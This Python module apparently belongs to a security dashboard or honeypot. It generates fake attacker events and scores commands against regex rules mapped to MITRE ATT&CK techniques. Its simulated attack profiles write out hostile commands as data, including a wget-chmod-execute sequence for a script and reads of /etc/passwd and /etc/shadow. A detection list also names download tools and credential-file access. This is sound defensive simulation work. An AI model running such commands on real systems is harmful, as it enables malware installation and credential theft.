# correlation/correlator.py

import re
import random
from datetime import datetime, timezone

# -----------------------------
# Attack profiles (used by dashboard background engine)
# -----------------------------
ATTACK_PROFILES = {
    "185.220.101.1": ["wget http://malware.sh", "chmod +x malware.sh", "./malware.sh"],
    "103.21.244.7": ["cat /etc/passwd", "cat /etc/shadow"],
    "8.8.8.8": ["ls -la", "pwd", "whoami"],
    "1.1.1.1": ["ssh root@localhost -p 2222", "uname -a"],
}

# -----------------------------
# Command → Risk + MITRE mapping
# -----------------------------
CMD_RULES = [
    (r"\bwhoami\b|\bid\b|\buname\b", 20, "T1082"),
    (r"\bls\b|\bcat\b|\bpwd\b", 25, "T1083"),
    (r"\b/etc/passwd\b|\bshadow\b", 60, "T1003"),
    (r"\bwget\b|\bcurl\b", 70, "T1105"),
    (r"\bchmod\b", 50, "T1222"),
    (r"\bcrontab\b", 80, "T1053"),
    (r"\bssh\b.*-p\b", 60, "T1021"),
]


def score_from_command(cmd: str) -> int:
    cmd = (cmd or "").lower()
    risk = 10
    for pattern, score, _ in CMD_RULES:
        if re.search(pattern, cmd):
            risk = max(risk, score)
    return min(100, risk)


def technique_from_command(cmd: str):
    cmd = (cmd or "").lower()
    for pattern, _, tech in CMD_RULES:
        if re.search(pattern, cmd):
            return tech
    return None


# -----------------------------
# Fake event generator (used by dashboard thread)
# -----------------------------
def generate_event(ip: str):
    cmd = random.choice(ATTACK_PROFILES[ip])
    risk = score_from_command(cmd)
    verdict = "BLOCKED" if risk >= 60 else "MONITOR"

    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": ip,
        "risk_score": risk,
        "verdict": verdict,
        "mitre_techniques": [technique_from_command(cmd)] if technique_from_command(cmd) else [],
        "geo": {"country": "Unknown"},
        "raw": {"cmd": cmd},
    }
